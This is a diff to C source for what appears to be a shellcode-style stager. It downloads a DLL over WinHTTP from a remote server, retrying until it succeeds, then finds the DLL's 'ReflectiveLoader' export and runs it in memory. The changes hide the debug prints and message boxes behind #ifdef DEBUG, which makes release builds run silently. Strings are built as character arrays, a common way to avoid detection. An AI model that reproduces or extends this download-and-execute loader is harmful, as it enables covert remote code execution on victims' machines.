@@ -207,6 +207,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         0
     );
 
+    #ifdef DEBUG
     if (hSession == NULL){
         WCHAR error[] = {'O', 'p', 'e', 'n', 'F', 0};
         ((WPRINTF)api->wprintf)(error);
@@ -214,6 +215,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
+    #endif
 
     HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(
         hSession,
@@ -222,6 +224,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         0
     );
 
+    #ifdef DEBUG
     if (hConnect == NULL){
         WCHAR error[] = {'C', 'o', 'n', 'n', 'F', 0};
         ((WPRINTF)api->wprintf)(error);
@@ -229,6 +232,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
+    #endif
 
     HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(
         hConnect,
@@ -240,6 +244,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         0
     );
 
+    #ifdef DEBUG
     if (hRequest == NULL){
         CHAR error[] = {'R', 'e', 'q', 'F', '\n', 0};
         ((PRINTF)api->printf)(error);
@@ -248,6 +253,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         ((WPRINTF)api->printf)(myFormat2, errorCode);
         ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
     }
+    #endif
 
     // Send the request
     BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
@@ -258,6 +264,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         0, 0, 0
     );
 
+    #ifdef DEBUG
     if (reqSuccess == FALSE) {
         WCHAR error[] = {'S', 'e', 'n', 'd', 'F', '\n', 0};
         ((WPRINTF)api->wprintf)(error);
@@ -265,8 +272,10 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
+    #endif
 
     BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
+    #ifdef DEBUG
     if (rcvResponse == FALSE) {
         WCHAR error[] = {'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0};
         ((WPRINTF)api->wprintf)(error, rcvResponse);
@@ -274,6 +283,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         WCHAR myFormat2[] = {'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0};
         ((WPRINTF)api->wprintf)(myFormat2, errorCode);
     }
+    #endif
 
     LPVOID lpContentLength = NULL;
     DWORD dwBufferLength = 0;
@@ -289,12 +299,16 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
         result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)( hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpContentLength, &dwBufferLength, WINHTTP_NO_HEADER_INDEX);
     }
 
-    if (result) {
+    if (result)
+    {
         dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
     }
-    else {
+    else
+    {
+        #ifdef DEBUG
         CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
         ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
+        #endif
     }
 
     LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
@@ -340,28 +354,36 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     WCHAR rlName[] = { 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'L', 'o', 'a', 'd', 'e', 'r', 0 };
 
     UINT_PTR uiDll = (UINT_PTR)lpDll;
+    #ifdef DEBUG
     WCHAR uiDllFormat[] = { 'd', 'l', 'l', 'A', 'd', 'd', 'r', 'e', 's', 's', ':', ' ', '%', 'p', '\n', 0 };
     ((WPRINTF)api->wprintf)(uiDllFormat, uiDll);
+    #endif
 
     UINT_PTR uiNtHeaders;
     UINT_PTR uiExportDirectoryData;
     //UINT_PTR uiExportDirectory;
 
     uiNtHeaders = uiDll + ((PIMAGE_DOS_HEADER)uiDll)->e_lfanew;
+    #ifdef DEBUG
     WCHAR ntHeaders[] = { 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', 's', ':', ' ', '%', 'p', '\n', 0 };
     ((WPRINTF)api->wprintf)(ntHeaders, uiNtHeaders);
+    #endif
 
     uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
     //ExportDirectoryData = OptionalHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     //ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiDll + Rva2Offset(ExportDirectoryData.VirtualAddress, uiDll));
     UINT_PTR uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
+    #ifdef DEBUG
     WCHAR pExportDir[] = { 'e', 'x', 'p', 'o', 'r', 't', 'd', 'i', 'r', ':', ' ', '%', 'p', '\n', 0 };
     ((WPRINTF)api->wprintf)(pExportDir, uiExportDirectory);
+    #endif
 
     DWORD uiExportDirectorySize = ((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->Size;
+    #ifdef DEBUG
     WCHAR pExportDirSize[] = { 'e', 'x', 'p', 'o', 'r', 't', 's', 'i', 'z', 'e', ':', ' ', '%', 'd', '\n', 0 };
     ((WPRINTF)api->wprintf)(pExportDirSize, uiExportDirectorySize);
+    #endif
 
     DWORD dwNumberOfEntries;
     UINT_PTR functionNameAddresses;
@@ -393,8 +415,10 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
 
 
     dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
+    #ifdef DEBUG
     CHAR entries[] = { 'e', 'n', 't', 'r', 'i', 'e', 's', ':', ' ', '%', 'd', '\n', 0 };
     ((PRINTF)api->printf)(entries, dwNumberOfEntries);
+    #endif
 
     // NOTE: ExportDirectory->AddressOf... gives an address to an array //
     // but the address is relative to the DLL base which is the address //
@@ -415,16 +439,21 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
         exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
         if (my_strcmp(exportedFunctionName, (CHAR*)rlName) == 0)
         {
+            #ifdef DEBUG
             CHAR error1[] = { 'R', 'L', ' ', 'N', 'o', 't', ' ', 'F', 'o', 'u', 'n', 'd', 0 };
             ((MESSAGEBOXA)api->MessageBoxA)(0, error1, error1, 0x0L);
+            #endif
 
             functionNameAddresses += sizeof(DWORD); // 32 bit pointers
             functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
             continue;
         }
-        else {
+        else
+        {
+            #ifdef DEBUG
             CHAR hm[] = { 'F', 'o', 'u', 'n', 'd', ' ', 'R', 'L', 0 };
             ((MESSAGEBOXA)api->MessageBoxA)(0, hm, hm, 0x0L);
+            #endif
             // Get the index from the ordinal table, multiply by the size
             // of how big one address in the function address table is.
             // This will give us the number to add to the pointer to
@@ -471,8 +500,11 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     //WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', 'O', 'f', 'f', 's', 'e', 't', ':', ' ', '%', 'p', '\n', 0 };
     //((WPRINTF)api->wprintf)(loader, loaderOffset);
     
+
+    #ifdef DEBUG
     WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
     ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
+    #endif
 
 
     //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
@@ -484,8 +516,11 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     HANDLE hResult = NULL;
 
     pDllMain = (DLLMAIN)pReflectiveLoader();
+
+    #ifdef DEBUG
     CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 0};
     ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+    #endif
 
     //WCHAR test[] = { 't', 'e', 's', 't', 0 };
     //((WPRINTF)api->wprintf)(test);
@@ -493,23 +528,22 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     if( pDllMain != NULL )
 	{
 		// call the loaded librarys DllMain to get its HMODULE
-		if( !pDllMain( NULL, DLL_QUERY_HMODULE, &hResult ) )
+		if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hResult) == FALSE)
 		{
+		    #ifdef DEBUG
             CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0};
             ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+            #endif
 		    hResult = NULL;
-		} else {
-            CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '?', 0};
 		}
-	} else
+	}
+    else
     {
+        #ifdef DEBUG
         CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0};
         ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
+        #endif
 	}
-
-    //HANDLE hThread = ((CREATETHREAD)api->CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)loaderOffset, NULL, 0, NULL);
-    //((WAITFORSINGLEOBJECT)api->WaitForSingleObject)(hThread, INFINITE);
-    //((CLOSEHANDLE)api->CloseHandle)(hThread);
 }
 
 void messagebox() {
@@ -602,14 +636,18 @@ void messagebox() {
 
     DWORD dwDllSize;
     LPVOID pRawDll = 0;
+    #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
+    #endif
     while (pRawDll == 0)
     {
         pRawDll = winHTTPClient(api, &dwDllSize);
         ((SLEEP)api->Sleep)(5000);
         if (pRawDll != 0)
         { break; }
+        #ifdef DEBUG
         ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
+        #endif
     }
 
     //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
